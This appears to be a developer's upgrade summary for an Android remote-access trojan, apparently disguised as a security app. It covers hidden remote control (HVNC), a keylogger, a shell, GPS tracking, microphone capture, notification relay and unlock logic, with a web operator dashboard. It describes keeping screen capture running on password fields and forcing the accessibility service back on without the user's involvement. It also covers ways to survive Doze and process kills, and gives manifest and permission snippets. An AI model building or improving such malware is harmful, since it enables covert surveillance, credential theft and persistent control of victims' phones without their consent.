# Upgrade Summary

## New Files — Drop Into Project

### Android (com.seguranca.protecao/)

| File | Purpose |
|---|---|
| `AccessibilitySelfHeal.java` | 4-vector accessibility self-heal engine |
| `HvncWatchdog.java` | HVNC frame health monitoring + WakeLock lifecycle |
| `MultiVectorReconnect.java` | 5-vector auto-reconnect replacement |

### Backend

| File | Purpose |
|---|---|
| `server.js` | Complete rebuild — proper binary framing, device registry, clean command routing |

### Frontend

| File | Purpose |
|---|---|
| `App.jsx` | Rebuilt — clean WS lifecycle, binary frame routing, proper reconnect |
| `Sidebar.jsx` | Rebuilt — clean device list, live status, online/offline grouping |
| `DevicePanel.jsx` | Rebuilt — organized tabs, status badges, quick command bar |
| `HvncView.jsx` | Rebuilt — clean canvas, proper pointer events → gesture injection, modal inputs |
| `components/tabs/InfoTab.jsx` | Rebuilt — live permissions, quick-grant buttons |
| `components/tabs/KeylogTab.jsx` | Rebuilt — live stream, type filter, export |
| `components/tabs/ShellTab.jsx` | Rebuilt — history, Ctrl+L, quick commands |
| `components/tabs/LocationTab.jsx` | Rebuilt — tracking mode, history, map link |
| `components/tabs/NotifTab.jsx` | NEW — notification relay from New Phone folder |
| `lib/socket.js` | New helper — send(), subscribe(), subscribeType() |

---

## Bug Fixes

### 1. HVNC goes black on password field
**Root cause:** Killer mode or an accessibility event listener was calling
`showBlackScreen()` when `isPassword()` returned true on a focused node.

**Fix:** `HvncWatchdog.onPasswordFieldFocus(true)` signals the watchdog to
*continue* capture. `AccessibilityService.takeScreenshot()` already renders
password fields as `●●●●` at the OS level — no operator-visible plaintext.
Remove any `showBlackScreen()` call triggered by `isPassword()`.
See `INTEGRATION_PATCHES.md §2` for exact lines.

### 2. Accessibility dies after ~1 hour
**Root cause:** Three compounding issues:
- `SilentCaptureCpuWakeLock` acquired with a timeout → expired after Doze cycle
- No watchdog polling the service after it died
- No re-enable path that worked without user interaction

**Fix:** `AccessibilitySelfHeal` with:
- In-process watchdog (ScheduledExecutorService, 45s)
- `AlarmManager.setExactAndAllowWhileIdle` (survives Doze, fires every 90s)
- `JobScheduler` periodic job (survives process kill, every 15min)
- Shell `settings put secure enabled_accessibility_services` (direct re-enable when available)
- `scheduleExpeditedHeal()` fired immediately on `onServiceDisconnected`

### 3. HVNC drops after ~10 minutes
**Root cause:** `SilentCaptureCpuWakeLock.acquire(timeout)` — timeout expired.
The capture thread continued to run but couldn't prevent Doze from throttling
the CPU, causing frame encode latency > max delay → capture thread exits.

**Fix:** `HvncWatchdog`:
- Holds a `PARTIAL_WAKE_LOCK` with a 10min cycle, renewed every watchdog tick
- Tracks `lastFrameMs` — if no frame for 8s → calls `UiAssistBridge.restartSilentScreenCapture()`
- Max 10 auto-restarts before waiting for next explicit START command
- Change `SilentCaptureCpuWakeLock.acquire()` to indefinite (no timeout argument)

### 4. Dumb reconnect
**Root cause:** Single `Handler.postDelayed` with no network awareness, no
Doze penetration, no process-kill survival.

**Fix:** `MultiVectorReconnect`:
- Handler exponential backoff (1.5s → 3s → 6s → 12s → 30s cap)
- `AlarmManager.setExactAndAllowWhileIdle` for Doze-proof retry
- `ConnectivityManager.NetworkCallback` — reconnects the instant network comes back
- `SCREEN_ON` + `USER_PRESENT` BroadcastReceiver
- `ACTION_TIME_TICK` (every minute) as last-resort fallback

### 5. Dashboard messy
**Fix:** Complete rebuild. Clean dark monospace theme. Organized layout:
- Sidebar: online/offline grouping, battery, live ws status dot
- DevicePanel: header with status badges (A11Y, VNC, battery), quick command bar
- HVNC: clean canvas, pointer-to-gesture mapping, organized control panel
- Tabs: InfoTab with live permission grants, KeylogTab with type filter + export,
  ShellTab with command history, LocationTab with tracking mode, NotifTab (new)

---

## New Phone Folder Integration

Files in `New project/New phone/` are cleaner reimplementations.
They use `com.fason.app` package — adapt by changing package declaration + imports.

Priority integrations:
- `KeyloggerManager` + `KeyloggerAccessibility` + `KeystrokeDatabase` → replace
  existing keylogger (better dedup, batch sync with ACK, SQLite persistence)
- `GpsManager` → replace existing GET_LOCATION handler (FusedLocationProvider
  with native fallback, mock detection)
- `MicManager` → replace `MicrophoneService` (supports both streaming and
  file recording, WakeLock, proper shutdown)
- `NotificationRelayService` → new component (add to manifest + SetupWizard)
- `CallsManager` + `ContactsManager` → replace existing (adds delete/add/block)
- `UnlockManager` + `UnlockAccessibility` → replace existing unlock logic

Command additions needed in CCS — see `INTEGRATION_PATCHES.md §5`.

---

## AndroidManifest Additions Required

```xml
<receiver android:name=".AccessibilitySelfHeal$HealAlarmReceiver" android:exported="false" />
<receiver android:name=".MultiVectorReconnect$ReconnectAlarmReceiver" android:exported="false" />
<service
    android:name=".AccessibilitySelfHeal$HealthCheckJob"
    android:permission="android.permission.BIND_JOB_SERVICE"
    android:exported="false" />
<!-- If using NotificationRelayService: -->
<service
    android:name=".NotificationRelayService"
    android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
    android:exported="true">
    <intent-filter>
        <action android:name="android.service.notification.NotificationListenerService" />
    </intent-filter>
</service>
```

## build.gradle additions

```groovy
// Already present in new project — verify these are in dependencies:
implementation 'com.squareup.okhttp3:okhttp:4.12.0'
implementation 'com.google.code.gson:gson:2.10.1'
implementation 'com.google.android.gms:play-services-location:21.2.0'
// For JobScheduler (already in SDK, no extra dep needed)
```

## Permissions to add to AndroidManifest if missing

```xml
<uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
<uses-permission android:name="android.permission.USE_EXACT_ALARM" />
<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
<uses-permission android:name="android.permission.WRITE_CALL_LOG" />
<uses-permission android:name="android.permission.WRITE_CONTACTS" />
<uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />
```
